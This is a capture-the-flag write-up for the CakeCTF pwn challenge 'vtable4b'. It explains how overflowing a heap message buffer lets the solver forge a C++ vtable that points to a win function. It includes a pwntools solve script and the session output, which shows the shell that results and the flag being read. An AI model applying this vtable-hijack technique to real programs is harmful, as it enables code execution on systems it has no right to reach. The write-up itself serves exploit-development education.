# vtable4b : Pwn

Do you understand what vtable is?

\* The flag exists somewhere in `/` directory.

Tags : C++, vtable, Win Function, Fake Vtable  
Author : ptr-yudai

# Solution
Try execute it.
```
$ nc 34.170.146.252 55878
Today, let's learn how to exploit C++ vtable!
You're going to abuse the following C++ class:

  class Cowsay {
  public:
    Cowsay(char *message) : message_(message) {}
    char*& message() { return message_; }
    virtual void dialogue();

  private:
    char *message_;
  };

An instance of this class is allocated in the heap:

  Cowsay *cowsay = new Cowsay(new char[0x18]());

You can
 1. Call `dialogue` method:
  cowsay->dialogue();

 2. Set `message`:
  std::cin >> cowsay->message();

Last but not least, here is the address of `win` function which you should call to get the flag:
  <win> = 0x55f6a9b4b61a

1. Use cowsay
2. Change message
3. Display heap
> 3

  [ address ]    [ heap data ]
               +------------------+
0x55f6d8006ea0 | 0000000000000000 |
               +------------------+
0x55f6d8006ea8 | 0000000000000021 |
               +------------------+
0x55f6d8006eb0 | 0000000000000000 | <-- message (= '')
               +------------------+
0x55f6d8006eb8 | 0000000000000000 |
               +------------------+
0x55f6d8006ec0 | 0000000000000000 |
               +------------------+
0x55f6d8006ec8 | 0000000000000021 |
               +------------------+
0x55f6d8006ed0 | 000055f6a9b4ece8 | ---------------> vtable for Cowsay
               +------------------+                 +------------------+
0x55f6d8006ed8 | 000055f6d8006eb0 |  0x55f6a9b4ece8 | 000055f6a9b4b6e2 |
               +------------------+                 +------------------+
0x55f6d8006ee0 | 0000000000000000 |                 --> Cowsay::dialogue
               +------------------+
0x55f6d8006ee8 | 000000000000f121 |
               +------------------+

1. Use cowsay
2. Change message
3. Display heap
>
```
This service output the heap condition and receive an arbitrary input starting from the message without restrict.  
Thus, we can overwrite the pointer from `Cowsay::dialogue` to `win`.

The apploach is as follows:
* Overwrite the pointer to location of `win` address.

The steps are as follows:
 * get `win` address
 * get `message` start address
 * input `win` address, location address of the win function and 0x18-padding
 * call `cowsay->dialogue();` overwritten onto the pointer to `win`

Execution code below:
```python solve.py
from pwn import *

p = remote("34.170.146.252", 44436)

p.recvuntil(b"<win> = 0x")
win_addr = int(p.recvline().strip(), 16)
log.info(hex(win_addr))

p.sendlineafter(b"> ", b"3")
message_addr = int(p.recvuntil(b"<--").strip()[-40:-25], 16)
log.info(hex(message_addr))

payload = p64(win_addr) + b"a"*0x18 + p64(message_addr)
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Message: ", payload)

p.sendlineafter(b"> ", b"3")
print(p.recvuntil(b"> "))

p.sendline(b"1")

p.interactive()
```
Execute it.
```
$ python3 solve.py
[+] Opening connection to 34.170.146.252 on port 44436: Done
[*] 0x55da2821a61a
[*] 0x55da61438eb0
b'\n
  [ address ]    [ heap data ]\n
               +------------------+\n
0x55da61438ea0 | 0000000000000000 |\n
               +------------------+\n
0x55da61438ea8 | 0000000000000021 |\n
               +------------------+\n
0x55da61438eb0 | 000055da2821a61a |\n
               +------------------+\n
0x55da61438eb8 | 6161616161616161 |\n
               +------------------+\n
0x55da61438ec0 | 6161616161616161 |\n
               +------------------+\n
0x55da61438ec8 | 6161616161616161 |\n
               +------------------+\n
0x55da61438ed0 | 000055da61438eb0 | ---------------> 'vtable for Cowsay (corrupted)
               +------------------+                 +------------------+
0x55da61438ed8 | 000055da61438e00 |  0x55da61438eb0 | 000055da2821a61a |
               +------------------+                 +------------------+
0x55da61438ee0 | 0000000000000000 |                 --> <win> function
               +------------------+
0x55da61438ee8 | 000000000000f121 |
               +------------------+

1. Use cowsay
2. Change message
3. Display heap
>
[*] Switching to interactive mode
[+] You're trying to use vtable at 0x55da61438eb0
[+] Congratulations! Executing shell...
$ $ ls
run
$ cd ../
$ ls
app
bin
boot
dev
etc
flag-806cb9c9719379667ca5616d9c8210f1.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag*
CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 44436
[*] Got EOF while sending in interactive
```

Got the flag!

`CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}`

# References
vtable(仮想関数テーブル)とは、C++などのオブジェクト指向プログラミング言語において、実行時に呼び出すメソッドを決定する動的ポリモーフィズムを実現するための仕組みのこと。  
クラスごとに作成され、仮想関数(オーバーライド可能な関数)へのポインタをまとめた配列を指す。
